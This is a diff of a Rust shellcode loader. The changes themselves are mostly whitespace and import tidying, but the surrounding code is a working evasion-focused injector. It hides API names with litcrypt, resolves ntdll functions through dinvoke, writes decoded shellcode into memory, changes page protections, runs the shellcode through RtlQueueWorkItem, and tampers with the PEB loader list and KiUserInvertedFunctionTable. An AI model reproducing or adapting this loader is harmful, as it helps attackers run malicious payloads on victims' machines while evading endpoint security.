@@ -2,13 +2,13 @@
 extern crate litcrypt;
 use_litcrypt!();
 
-use bindings::Windows::Win32::Foundation::{HANDLE};
+use bindings::Windows::Win32::Foundation::HANDLE;
 use bindings::Windows::Win32::System::Kernel::LIST_ENTRY;
 use bindings::Windows::Win32::System::Threading::{PEB, PROCESS_BASIC_INFORMATION};
-use bindings::Windows::Win32::System::WindowsProgramming::{LDR_DATA_TABLE_ENTRY};
+use bindings::Windows::Win32::System::WindowsProgramming::LDR_DATA_TABLE_ENTRY;
 use data::{MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE, PAGE_EXECUTE_READ, _INVERTED_FUNCTION_TABLE, PAGE_READONLY };
 use std::ffi::c_void;
-use std::mem::{size_of};
+use std::mem::size_of;
 use std::ptr::{self};
 
 fn get_sh() -> String
@@ -49,7 +49,7 @@ fn run() -> bool
         {
             return true;
         }
-       
+
         let base_address: *mut c_void = *base_address_shellcode;
         let written: usize = 0;
         let buffer: *mut c_void = std::mem::transmute(decoded_sh.as_ptr());
@@ -132,12 +132,12 @@ fn run() -> bool
         quit_shutdown();
 
         let f: data::RtlQueueWorkItem;
-        let _r: Option<bool>;
+        let _r: Option<i32>;
         let dir: *mut c_void = *base_address_shellcode; 
         let context: *mut c_void = std::mem::transmute(0isize);
         // Run the injected shellcode on the default thread pool
         dinvoke::dynamic_invoke!(ntdll,&lc!("RtlQueueWorkItem"),f,_r,dir,context,0x00000000 as u32);
-        
+
         let ki_user_inverted_function_table = dinvoke::get_function_address(ntdll, &lc!("KiUserInvertedFunctionTable"));
         let s = isize::default();
         let size: *mut usize = std::mem::transmute(&s);
@@ -177,7 +177,7 @@ fn run() -> bool
             size, 
             PAGE_READONLY, 
             old_protection);
-        
+
         dinvoke::close_handle(phand);
 
         true
@@ -195,7 +195,6 @@ fn restore_peb()
     unsafe
     {
         let kernelbase = dinvoke::get_module_base_address(&lc!("kernelbase.dll")) as isize;
-       
         let phand: HANDLE = HANDLE {0: -1};
 
         let pi = PROCESS_BASIC_INFORMATION::default();
@@ -229,7 +228,6 @@ fn restore_peb()
         {
             return;
         } 
-
 
         let peb_ldr_data: data::PEB_LDR_DATA = std::mem::zeroed();
         let peb_ldr_data_ptr: *mut data::PEB_LDR_DATA = std::mem::transmute(&peb_ldr_data);
@@ -288,7 +286,7 @@ fn restore_peb()
                     size_of::<LDR_DATA_TABLE_ENTRY>(), 
                     bytes_written
                 ); 
-                
+
                 return;
                
             }
